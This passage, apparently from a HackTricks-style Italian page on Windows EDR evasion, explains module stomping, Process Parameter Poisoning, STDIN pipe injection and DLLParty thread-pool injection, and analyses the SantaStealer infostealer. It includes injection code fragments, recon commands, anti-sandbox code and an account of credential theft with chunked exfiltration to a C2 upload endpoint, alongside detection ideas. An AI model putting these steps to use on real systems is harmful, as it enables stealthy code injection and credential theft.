- Sospendi il thread principale prima di ripristinare il TIB/contesto (`NtSuspendThread` → ripristino → `NtResumeThread`), riducendo così la finestra di race in cui uno scanner potrebbe rilevare uno stack ripristinato solo parzialmente.

Questo sostituisce la firma `CreateTimerQueueTimer` + `NtContinue` con una firma basata su thread helper/APC, mantenendo gli stessi obiettivi di mascheramento RC4 e spoofing dello stack.

Ulteriori idee per il rilevamento
- `NtSetInformationVirtualMemory` con `VmCfgCallTargetInformation` poco prima di sleep, attese o dispatch APC.
- `GetThreadContext`/`SetThreadContext` attorno a `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` o `ConnectNamedPipe`.
- `NtQueryInformationThread` seguito da scritture dirette nei limiti dello stack TEB/TIB del thread corrente.
- Catene `NtQueueApcThread`/`NtAlertResumeThread` che raggiungono indirettamente `SystemFunction032`, `VirtualProtect` o helper per il ripristino delle autorizzazioni delle sezioni.
- Uso ripetuto di brevi firme di gadget come `FF 23` (`jmp [rbx]`) o `FF E7` (`jmp rdi`) come pivot di dispatch all’interno di moduli firmati.


## Module Stomping di precisione

Il module stomping esegue i payload dalla **sezione `.text` di una DLL già mappata nel processo target**, invece di allocare memoria eseguibile privata facilmente rilevabile o caricare una nuova DLL sacrificabile. Il target di sovrascrittura dovrebbe essere un’**immagine caricata e supportata da file su disco**, la cui area di codice possa contenere il payload senza corrompere percorsi di codice ancora necessari al processo.<sup>[[1]](#references)[[2]](#references)</sup>

### Selezione affidabile del target

Il module stomping ingenuo su moduli comuni come `uxtheme.dll` o `comctl32.dll` è fragile: la DLL potrebbe non essere caricata nel processo remoto e una regione di codice troppo piccola può causare l’arresto anomalo del processo. Un flusso di lavoro più affidabile è il seguente:

1. Enumera i moduli del processo target e mantieni un elenco di inclusione contenente **solo i nomi** delle DLL già caricate.
2. Crea prima il payload e registra la sua **dimensione esatta in byte**.
3. Analizza le DLL candidate su disco e confronta `Misc_VirtualSize` della sezione PE **`.text`** con la dimensione del payload. Questo dato è più importante della dimensione del file, perché riflette la dimensione della sezione eseguibile **quando è mappata in memoria**.
4. Analizza la **Export Address Table (EAT)** e scegli l’RVA di una funzione esportata come offset iniziale per lo stomping.
5. Calcola il **raggio d’impatto**: se il payload supera il limite della funzione selezionata, sovrascriverà gli export adiacenti disposti dopo di essa in memoria.

Helper di ricognizione/selezione tipici osservati in natura:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Note operative
- Preferisci DLLs **già caricate** nel processo remoto per evitare la telemetry di `LoadLibrary`/caricamenti inattesi di immagini.
- Preferisci export eseguiti raramente dall'applicazione target; in caso contrario, i normali percorsi del codice potrebbero raggiungere i byte modificati prima o dopo la creazione del thread.
- Gli implant di grandi dimensioni spesso richiedono di cambiare l'inserimento dello shellcode da string literal a **byte-array/braced initializer**, così che l'intero buffer venga rappresentato correttamente nel codice sorgente dell'injector.

Idee per il rilevamento
- Scritture remote in pagine eseguibili supportate da immagini (`MEM_IMAGE`, `PAGE_EXECUTE*`) anziché nelle più comuni allocazioni private RWX/RX.
- Entry point di export i cui byte in memoria non corrispondono più al file di origine su disco.
- Thread remoti o pivot del contesto che iniziano l'esecuzione all'interno di un export di una DLL legittima i cui byte iniziali sono stati modificati di recente.
- Sequenze sospette di `VirtualProtect(Ex)` / `WriteProcessMemory` sulle pagine `.text` di una DLL, seguite dalla creazione di un thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) è una tecnica di **process-injection / EDR-evasion** che evita il classico percorso di scrittura remota (`VirtualAllocEx` + `WriteProcessMemory`). Invece di copiare byte in un target già in esecuzione, sfrutta il fatto che Windows **copia parametri di avvio selezionati di `CreateProcessW` nel processo figlio** e li memorizza in `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carrier avvelenabili copiati da `CreateProcessW`

I carrier utili sono:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (con `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vincoli pratici dei carrier:

- `lpCommandLine` deve puntare a **memoria scrivibile** per `CreateProcessW` ed è limitato a **32,767 caratteri Unicode**, incluso il terminatore null.
- `lpEnvironment` deve essere un blocco di ambiente Unicode composto da stringhe consecutive `NOME=VALORE\0`, terminate da un ulteriore `\0`.
- `lpReserved` è ufficialmente riservato, quindi la mappatura `ShellInfo` va considerata un dettaglio d'implementazione, non un contratto documentato stabile.

In questo modo, la normale creazione di processi diventa la **primitiva di trasferimento del payload**. L'operatore crea il processo figlio con dati di avvio controllati dall'attaccante e lascia che sia Windows a eseguire la copia tra processi.

### Flusso di ricerca remota senza API di scrittura remota

Dopo la creazione del processo figlio, individua il buffer copiato con primitive di **sola lettura**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → ottieni `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Leggi la `PEB` remota
3. Segui `PEB.ProcessParameters`
4. Leggi `RTL_USER_PROCESS_PARAMETERS`
5. Usa il puntatore selezionato:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Flusso minimo:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Esecuzione del buffer dei parametri copiato

La regione dei parametri copiata è solitamente `RW`, non eseguibile. Una catena P3 comune è:

1. Creare normalmente il processo (non sospeso)
2. Rendere eseguibile la pagina dei parametri scelta con `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Riutilizzare l'handle del thread principale già restituito in `PROCESS_INFORMATION`
4. Reindirizzare l'esecuzione con `NtSetContextThread` (`CONTEXT_CONTROL`, sovrascrivere `RIP`)

A differenza dei workflow classici di thread hijacking, questo **non richiede** `SuspendThread` / `ResumeThread`; il contesto può essere modificato direttamente tramite l'handle del thread principale restituito.

Questo evita diverse API comunemente monitorate per l'injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- spesso anche `SuspendThread` / `ResumeThread`

### Limite dei byte nulli e shellcode a fasi

Tutti e tre i carrier contengono **dati stringa o simili a stringhe**, quindi un payload grezzo contenente `0x00` viene troncato durante il trasferimento. Una soluzione pratica è usare un **primo stage privo di byte nulli**, che ricostruisce le costanti a runtime e poi carica un secondo stage arbitrario.

Un pattern semplice è la sintesi di costanti basata su XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Questo consente al primo stage di creare stringhe sullo stack, argomenti API, percorsi DLL o un loader shellcode di secondo stage senza incorporare byte nulli nel parametro trasportato.

### Chiamate API basate sullo stack dal primo stage

Quando il primo stage deve chiamare API come `LoadLibraryA`, può:

- inserire la stringa/buffer nello stack del target
- riservare i **32 byte di shadow space x64**
- impostare `RCX`, `RDX`, `R8`, `R9` su costanti o puntatori relativi a `RSP`
- mantenere `RSP` **allineato a 16 byte** prima della chiamata

Un secondo stage può quindi essere copiato dallo stack in un'allocazione `PAGE_READWRITE`, impostato su `PAGE_EXECUTE_READ` con `VirtualProtect` e raggiunto con un salto, evitando un'allocazione RWX diretta.

### Idee per il rilevamento

Buone opportunità di ricerca menzionate dagli autori:

- `VirtualProtectEx` / `NtProtectVirtualMemory` che rendono **eseguibili le pagine dei parametri di processo**
- tale modifica della protezione seguita da `SetThreadContext` / `NtSetContextThread`
- letture remote del `PEB` seguite da letture di `RTL_USER_PROCESS_PARAMETERS`
- valori insolitamente lunghi o ad alta entropia in `lpCommandLine`, `lpEnvironment` o `STARTUPINFO.lpReserved` durante la creazione del processo

### Note

- P3 è un **trucco di trasferimento tra processi**, non una primitiva di esecuzione completa: il parametro copiato necessita ancora di una modifica dei permessi di esecuzione e di un metodo di reindirizzamento dell'esecuzione.
- Gli autori hanno preso in considerazione `RtlCreateProcessReflection` / Dirty Vanity, ma l'hanno scartato perché al suo interno ricorre a primitive sospette come `NtWriteVirtualMemory` e `NtCreateThreadEx`.

## Console STDIN pipe injection

Un processo figlio con console interattiva può essere usato anche come **primitiva di trasferimento del payload**. L'injector reindirizza lo standard input del figlio verso una pipe e invia un marker seguito dallo shellcode. Dopo che il programma console ha letto i dati nella propria memoria privata, l'injector individua quel buffer, lo rende eseguibile e reindirizza un thread del figlio verso di esso. Questo evita `VirtualAllocEx` e `WriteProcessMemory`, ma si tratta comunque di process injection, non di un bypass EDR generico.<sup>[[41]](#references)</sup>

Nonostante la descrizione «named-pipe», l'implementazione di riferimento chiama `CreatePipe`, che crea una **pipe anonima**. Windows implementa internamente le pipe anonime con oggetti pipe dotati di nomi univoci, ma la PoC non seleziona un percorso `\\.\pipe\<name>` né chiama `CreateNamedPipe`. Crea handle ereditabili con un descrittore di sicurezza predefinito, inserisce l'handle di lettura in `STARTUPINFO.hStdInput`, imposta `STARTF_USESTDHANDLES` e avvia un nuovo processo figlio con l'ereditarietà degli handle abilitata. Pertanto, questa PoC avvia l'eseguibile console specificato; non collega la pipe a un processo esistente.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Flusso di lavoro di riferimento

L'implementazione usa la seguente catena:<sup>[[41]](#references)</sup>

1. Crea coppie di pipe anonime per `STDIN` e `STDOUT` del figlio. Disabilita l'ereditarietà sui due handle lato genitore e, dopo la creazione del processo, chiude nel genitore i duplicati lato figlio.
2. Avvia un eseguibile interattivo come `netsh.exe` o `nslookup.exe` con `CREATE_NEW_CONSOLE`. Il figlio eredita gli handle standard reindirizzati.
3. Invia l'intero array binario `rawData` con `WriteFile` tramite l'handle `STDIN` lato genitore. Il programma console consuma i byte e ne lascia una copia in una delle proprie regioni private con commit.
4. Esamina lo spazio degli indirizzi del figlio con `VirtualQueryEx`, legge le regioni candidate `MEM_PRIVATE` con `ReadProcessMemory` e cerca il marker all'inizio di `rawData`.
5. Cambia la protezione del buffer individuato in `PAGE_EXECUTE_READWRITE` con `VirtualProtectEx`.
6. Individua il thread principale, lo sospende, imposta `RIP` su `found_address + 0x19` con `NtSetContextThread` e lo riprende.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

L'implementazione fornita è specifica per x64: modifica `CONTEXT.Rip` e il payload incorporato è shellcode x64. `rawData` inizia con un marker di 25 byte, quindi i byte eseguibili iniziano all'offset esadecimale `0x19`. Quando sostituisci il payload, mantieni questo layout oppure aggiorna insieme il marker, il vettore di ricerca, la dimensione dell'array e l'offset di esecuzione. I commenti nel sorgente indicano inoltre `0x0A`, `0x0D` e `0x1A` come caratteri non validi. Questo workflow non modifica il token né i privilegi del processo figlio.<sup>[[41]](#references)</sup>

Per piccoli helper nativi e pattern di compilazione dei payload, vedi [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## DLL injection tramite callback del thread pool senza shellcode (DLLParty)

DLLParty adatta la tecnica di thread-pool injection in stile PoolParty per fare in modo che un worker esistente del processo target chiami `LoadLibraryA`, invece di eseguire uno stub di callback iniettato. La primitiva di dispatch è un completamento `TP_DIRECT` accodato alla porta di completamento I/O del pool del target. Questo non aggira i permessi del processo: il PoC chiama `OpenProcess(PROCESS_ALL_ACCESS)` e necessita di memoria leggibile/scrivibile nel target e di handle duplicabili per la worker factory e la porta di completamento.<sup>[[46]](#references)[[47]](#references)</sup>

Su Windows x64, il worker passa in `RCX`, il primo argomento della callback, un puntatore a `TP_CALLBACK_INSTANCE` allocato nello stack. `LoadLibraryA` interpreta lo stesso puntatore come un `LPCSTR`. Nel percorso testato, `TppWorkerThread` crea il puntatore a `RSP+0x178`, mentre la prima normale scrittura in quell'oggetto avviene a `RSP+0x1d0`. Un percorso DLL con terminazione null che rientri in questo prefisso di 0x58 byte può quindi occupare l'inizio dell'istanza senza essere sovrascritto prima del dispatch. Questa è un'osservazione specifica della build, non una garanzia documentata dell'ABI di Windows.<sup>[[46]](#references)[[47]](#references)</sup>

Il workflow di riferimento è:<sup>[[46]](#references)[[47]](#references)</sup>

1. Enumera gli handle del target con `NtQuerySystemInformation(SystemHandleInformation)` e identifica `TpWorkerFactory` interrogando i tipi di oggetto. Duplica un handle della worker factory e interroga `WorkerFactoryBasicInformation`; `StartParameter` restituisce il `TP_POOL` remoto. Salta le factory con `TotalWorkerCount == 0`.
2. Leggi `TP_POOL.CompletionPort` e percorri la lista privata dei worker del pool. Nella build x64 di Windows 10 19045 testata (`ntdll.dll 10.0.19041.4842`), la testa si trova a `pool+0x60`; ogni collegamento è a `worker+0x10`, quindi lo slot dell'istanza di callback a `worker+0x38` equivale a `link+0x28`. Il PoC verifica l'allineamento dei puntatori, la reciprocità dei collegamenti, l'appartenenza al pool, gli ID thread non nulli, i nodi ripetuti e la stabilità della testa della lista.
3. Scrivi il percorso DLL in **ogni** slot del worker individuato, perché il completamento accodato potrebbe essere gestito da qualsiasi worker. Posiziona un `TP_DIRECT` con `Callback = LoadLibraryA` nella memoria scrivibile del target. Il PoC usa `last_slot-0x500` sullo stack di un worker invece di `VirtualAllocEx`; questo offset è sperimentale e non deve sovrapporsi ai dati dello stack in uso.
4. Duplica l'handle della porta di completamento del target e chiama `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. L'indirizzo remoto di `TP_DIRECT` è la chiave di completamento. Un worker esistente invoca quindi `LoadLibraryA` con il puntatore dell'istanza di callback sovrascritto, caricando una DLL già accessibile al target.

Il PoC accetta il PID del target (`DLLParty.exe <target_pid>`) e usa un percorso DLL hardcoded in `DLLParty.cpp`; imposta un percorso accessibile al target prima di compilare un eseguibile x64. Usa inoltre l'indirizzo di `LoadLibraryA` del proprio processo come callback remota, quindi presume che tale indirizzo sia valido nel target. Il codice non verifica che la lunghezza del percorso rientri nel prefisso di 0x58 byte, né che l'attraversamento dei worker abbia individuato uno slot prima di indicizzare l'ultimo elemento. Verifica nuovamente gli offset privati, il layout dello stack e lo spazio scrivibile per la build target. Omettere `CreateRemoteThreadEx`, lo shellcode e `VirtualAllocEx` non elimina le scritture tra processi né la telemetria relativa al caricamento della DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Tecniche di SantaStealer per l'evasione fileless e il furto di credenziali

SantaStealer (noto anche come BluelineStealer) mostra come i moderni info-stealer combinino AV bypass, anti-analisi e accesso alle credenziali in un unico workflow.<sup>[[24]](#references)</sup>

### Verifica del layout della tastiera e ritardo sandbox

- Un flag di configurazione (`anti_cis`) enumera i layout di tastiera installati tramite `GetKeyboardLayoutList`. Se viene trovato un layout cirillico, il sample crea un marker `CIS` vuoto e termina prima di eseguire gli stealer, assicurandosi che non si attivi mai nelle aree geografiche escluse e lasciando al contempo un artefatto utile per la ricerca delle minacce.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Logica `check_antivm` a più livelli

- La variante A scorre l’elenco dei processi, calcola un checksum rolling personalizzato per ogni nome e lo confronta con blocklist incorporate di debugger/sandbox; ripete il calcolo del checksum sul nome del computer e controlla directory di lavoro come `C:\analysis`.
- La variante B esamina le proprietà del sistema (numero minimo di processi, uptime recente), chiama `OpenServiceA("VBoxGuest")` per rilevare le additions di VirtualBox ed esegue controlli temporali durante le pause per individuare l’esecuzione single-step. Qualsiasi rilevamento interrompe l’esecuzione prima dell’avvio dei moduli.

### Helper fileless + caricamento reflective con doppio ChaCha20

- La DLL/EXE principale include un helper per le credenziali di Chromium, che viene salvato su disco oppure mappato manualmente in memoria; in modalità fileless risolve autonomamente importazioni/rilocazioni, così non vengono scritti artefatti dell’helper.
- L’helper memorizza una DLL di secondo stadio cifrata due volte con ChaCha20 (due chiavi da 32 byte + nonce da 12 byte). Dopo entrambi i passaggi, carica il blob in modo reflective (senza `LoadLibrary`) e chiama le esportazioni `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivate da [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Le routine di ChromElevator usano il process hollowing reflective tramite direct syscall per iniettarsi in un browser Chromium attivo, ereditare le chiavi AppBound Encryption e decrittare password/cookie/carte di credito direttamente dai database SQLite, nonostante le protezioni ABE.


### Raccolta modulare in memoria ed esfiltrazione HTTP a blocchi

- `create_memory_based_log` scorre una tabella globale di puntatori a funzione `memory_generators` e avvia un thread per ogni modulo abilitato (Telegram, Discord, Steam, screenshot, documenti, estensioni del browser e così via). Ogni thread scrive i risultati in buffer condivisi e comunica il numero di file al termine di un’attesa di join di circa 45 secondi.
- Al termine, tutto viene compresso con la libreria `miniz` collegata staticamente e salvato come `%TEMP%\\Log.zip`. `ThreadPayload1` attende quindi 15 secondi e trasmette l’archivio in blocchi da 10 MB tramite HTTP POST a `http://<C2>:6767/upload`, simulando un boundary del browser `multipart/form-data` (`----WebKitFormBoundary***`). Ogni blocco include `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` facoltativo, e l’ultimo blocco aggiunge `complete: true` per segnalare al C2 che il riassemblaggio è terminato.

## References

- [1] [Tecniche avanzate di evasione: precisione nel module stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack: niente più pass gratuiti per il malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentazione](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – esempio](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – esempio](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC per lo spoofing del call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nuova catena di infezione e offuscamento basato su ConfuserEx per DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Dovresti fidarti del tuo zero trust? Bypass dei controlli di postura di Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Prima di ToolShell: analisi delle precedenti operazioni ransomware di Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: abuso delle esportazioni inoltrate](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventario delle esportazioni inoltrate di Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Ordine di ricerca delle librerie a collegamento dinamico](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Sicurezza dei processi e diritti di accesso](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Riferimento EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Launcher CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Contrastare gli EDR con la protezione Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Spezzare la barriera protettiva di Windows Defender con la tecnica Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Riferimento del comando mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Dietro la cortina di Pure: da RAT a builder a coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer sta arrivando in città: un nuovo e ambizioso infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Decrittazione di Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: contrastare il malware Node.js con il tracing delle API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [La bella addormentata: mettere a riposo Adaptix con Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Avvelenamento dei parametri di processo](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [La bella addormentata II: CFG, CET e stack spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Offuscamento del sonno Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Nascondere il tuo Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abuso di Chrome Remote Desktop nelle operazioni Red Team: guida pratica](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: trasformare il driver di remediation di Defender in una primitiva per operazioni kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Codice companion di Function Peekaboo di MDSec](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: creare funzioni auto-mascheranti con LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - Codice sorgente di InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Funzione CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creazione di un processo figlio con input e output reindirizzati](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - Necromancy di GhostPack: riforgiare strumenti C# con WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compilazione di progetti C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Proof-of-concept e codice sorgente di DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abuso degli interni del thread pool per l’iniezione di DLL senza shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Dataset benchmark EMBER2024 e strumenti thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Uso di EMBER2024 per valutare gli implant Red Team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Elusione dei rilevamenti basati su machine learning](https://msecops.de/blog/posts/ml-evasion/)
{{#include ../banners/hacktricks-training.md}}
